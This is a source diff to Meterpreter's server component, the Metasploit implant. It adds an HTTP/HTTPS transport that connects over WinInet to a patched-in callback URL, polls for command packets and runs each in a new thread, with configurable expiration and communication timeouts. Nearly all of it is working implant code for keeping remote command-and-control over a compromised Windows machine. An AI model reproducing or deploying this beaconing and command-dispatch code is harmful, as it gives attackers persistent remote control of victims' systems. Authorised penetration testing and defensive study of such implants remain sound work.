@@ -1,6 +1,12 @@
 #include "metsrv.h"
 #include "../../common/common.h"
 
+
+char * global_meterpreter_transport = "METERPRETER_TRANSPORT_SSL\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
+char * global_meterpreter_url = "https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00";
+int global_expiration_timeout = 0xb64be661;
+int global_comm_timeout       = 0xaf79257f;
+
 #ifdef _WIN32
 
 #include <windows.h> // for EXCEPTION_ACCESS_VIOLATION 
@@ -313,7 +319,7 @@ static BOOL server_negotiate_ssl(Remote *remote)
 }
 
 /*
- * The servers main dispatch loop for incoming requests.
+ * The servers main dispatch loop for incoming requests using SSL over TCP
  */
 static DWORD server_dispatch( Remote * remote )
 {
@@ -358,6 +364,135 @@ static DWORD server_dispatch( Remote * remote )
 			break;
 		}
 	}
+
+	dprintf( "[DISPATCH] calling scheduler_destroy..." );
+	scheduler_destroy();
+
+	dprintf( "[DISPATCH] calling command_join_threads..." );
+	command_join_threads();
+
+	dprintf( "[DISPATCH] leaving server_dispatch." );
+
+	return result;
+}
+
+
+/*
+ * The servers main dispatch loop for incoming requests using SSL over TCP
+ */
+static DWORD server_dispatch_http_wininet( Remote * remote )
+{
+	LONG result     = ERROR_SUCCESS;
+	Packet * packet = NULL;
+	THREAD * cpt    = NULL;
+	URL_COMPONENTS bits;
+	DWORD ecount = 0;
+	DWORD delay = 0;
+
+	
+	if (global_expiration_timeout > 0) 
+		remote->expiration_time  = current_unix_timestamp() + global_expiration_timeout;
+	else
+		remote->expiration_time = 0;
+	
+	remote->comm_timeout     = global_comm_timeout;
+	remote->start_time       = current_unix_timestamp();
+	remote->comm_last_packet = current_unix_timestamp();
+	
+	// Allocate the top-level handle
+	remote->hInternet = InternetOpen("Meterpreter/Windows", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+	if (!remote->hInternet) {
+		dprintf("[DISPATCH] Failed InternetOpen: %d", GetLastError());
+		return 0;
+	}
+	dprintf("[DISPATCH] Configured hInternet: 0x%.8x", remote->hInternet);
+
+	// The InternetCrackUrl method was poorly designed...
+	memset(&bits, 0, sizeof(bits));
+	bits.dwStructSize = sizeof(bits);
+	bits.dwSchemeLength    = 1;
+	bits.dwHostNameLength  = 1;
+	bits.dwUserNameLength  = 1;
+	bits.dwPasswordLength  = 1;
+	bits.dwUrlPathLength   = 1;
+	bits.dwExtraInfoLength = 1;
+	InternetCrackUrl(remote->url, 0, 0, &bits);
+
+	remote->uri = _strdup(bits.lpszUrlPath);
+
+	bits.lpszHostName[bits.dwHostNameLength] = 0;
+
+
+	dprintf("[DISPATCH] Configured URL: %s", remote->uri);
+	dprintf("[DISPATCH] Host: %s Port: %u", bits.lpszHostName, bits.nPort);
+
+	// Allocate the connection handle
+	remote->hConnection = InternetConnect(remote->hInternet, bits.lpszHostName, bits.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+	if (!remote->hConnection) {
+		dprintf("[DISPATCH] Failed InternetConnect: %d", GetLastError());
+		return 0;
+	}
+	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", remote->hConnection);
+
+
+	// Bring up the scheduler subsystem.
+	result = scheduler_initialize( remote );
+	if( result != ERROR_SUCCESS )
+		return result;
+
+	while( TRUE )
+	{
+		if (remote->comm_timeout != 0 && remote->comm_last_packet + remote->comm_timeout < current_unix_timestamp()) {
+			dprintf("[DISPATCH] Shutting down server due to communication timeout");
+			break;
+		}
+
+		if (remote->expiration_time != 0 && remote->expiration_time < current_unix_timestamp()) {
+			dprintf("[DISPATCH] Shutting down server due to hardcoded expiration time");
+			dprintf("Timestamp: %u  Expiration: %u", current_unix_timestamp(), remote->expiration_time);
+			break;
+		}
+
+		if( event_poll( serverThread->sigterm, 0 ) )
+		{
+			dprintf( "[DISPATCH] server dispatch thread signaled to terminate..." );
+			break;
+		}
+
+		dprintf("[DISPATCH] Reading data from the remote side...");
+		result = packet_receive( remote, &packet );
+		if( result != ERROR_SUCCESS ) {
+
+			if (ecount < 10)
+				delay = 10 * ecount;
+			else 
+				delay = 100 * ecount;
+			
+			ecount++;
+
+			dprintf("[DISPATCH] no pending packets, sleeping for %dms...", min(10000, delay));
+			Sleep( min(10000, delay) );
+			continue;
+		}
+
+		remote->comm_last_packet = current_unix_timestamp();
+
+		// Reset the empty count when we receive a packet
+		ecount = 0;
+
+		dprintf("[DISPATCH] Returned result: %d", result);
+
+		cpt = thread_create( command_process_thread, remote, packet );
+		if( cpt )
+		{
+			dprintf( "[DISPATCH] created command_process_thread 0x%08X, handle=0x%08X", cpt, cpt->handle );
+			thread_run( cpt );
+		}	
+	}
+
+	// Close WinInet handles
+	InternetCloseHandle(remote->hConnection);
+	InternetCloseHandle(remote->hInternet);
 
 	dprintf( "[DISPATCH] calling scheduler_destroy..." );
 	scheduler_destroy();
@@ -447,6 +582,19 @@ DWORD server_setup( SOCKET fd )
 				break;
 			}
 
+			remote->url = global_meterpreter_url;
+
+			if (strcmp(global_meterpreter_transport+12, "TRANSPORT_SSL") == 0) {
+				remote->transport = METERPRETER_TRANSPORT_SSL;
+				dprintf("[SERVER] Using SSL transport...");
+			} else if (strcmp(global_meterpreter_transport+12, "TRANSPORT_HTTPS") == 0) {
+				remote->transport = METERPRETER_TRANSPORT_HTTPS;
+				dprintf("[SERVER] Using HTTPS transport...");
+			} else if (strcmp(global_meterpreter_transport+12, "TRANSPORT_HTTP") == 0) {
+				remote->transport = METERPRETER_TRANSPORT_HTTP;
+				dprintf("[SERVER] Using HTTP transport...");
+			}
+
 			// Do not allow the file descriptor to be inherited by child processes
 			SetHandleInformation((HANDLE)fd, HANDLE_FLAG_INHERIT, 0);
 
@@ -474,31 +622,53 @@ DWORD server_setup( SOCKET fd )
 			remote->cpCurrentDesktopName = _strdup( cDesktopName );
 #endif
 
-			dprintf("[SERVER] Flushing the socket handle...");
-			server_socket_flush( remote );
+
+
+
+			// Process our default SSL-over-TCP transport
+			if (remote->transport == METERPRETER_TRANSPORT_SSL) {
+				dprintf("[SERVER] Flushing the socket handle...");
+				server_socket_flush( remote );
 		
-			dprintf("[SERVER] Initializing SSL...");
-			if( !server_initialize_ssl( remote ) )
-				break;
+				dprintf("[SERVER] Initializing SSL...");
+				if( !server_initialize_ssl( remote ) )
+					break;
 
-			dprintf("[SERVER] Negotiating SSL...");
-			if( !server_negotiate_ssl( remote ) )
-				break;
+				dprintf("[SERVER] Negotiating SSL...");
+				if( !server_negotiate_ssl( remote ) )
+					break;
 
-			dprintf("[SERVER] Registering dispatch routines...");
-			register_dispatch_routines();
+				dprintf("[SERVER] Registering dispatch routines...");
+				register_dispatch_routines();
 
-			dprintf("[SERVER] Entering the main server dispatch loop...");
-			server_dispatch( remote );
+				dprintf("[SERVER] Entering the main server dispatch loop for transport %d...", remote->transport);
+				server_dispatch( remote );
 		
-			dprintf("[SERVER] Deregistering dispatch routines...");
-			deregister_dispatch_routines( remote );
+				dprintf("[SERVER] Deregistering dispatch routines...");
+				deregister_dispatch_routines( remote );
+			}
+
+			if (remote->transport == METERPRETER_TRANSPORT_HTTP || remote->transport == METERPRETER_TRANSPORT_HTTPS) {
+				dprintf("[SERVER] Registering dispatch routines...");
+				register_dispatch_routines();
+				
+				dprintf("[SERVER] Entering the main server dispatch loop for transport %d...", remote->transport);
+#ifdef _WIN32
+				server_dispatch_http_wininet( remote );
+#else
+				// XXX: Handle non-windows HTTP transport
+#endif 
+
+				dprintf("[SERVER] Deregistering dispatch routines...");
+				deregister_dispatch_routines( remote );
+			}
 
 		} while (0);
 
-		dprintf("[SERVER] Closing down SSL...");
-
-		server_destroy_ssl( remote );
+		if (remote->transport == METERPRETER_TRANSPORT_SSL) {
+			dprintf("[SERVER] Closing down SSL...");
+			server_destroy_ssl( remote );
+		}
 
 		if( remote )
 			remote_deallocate( remote );
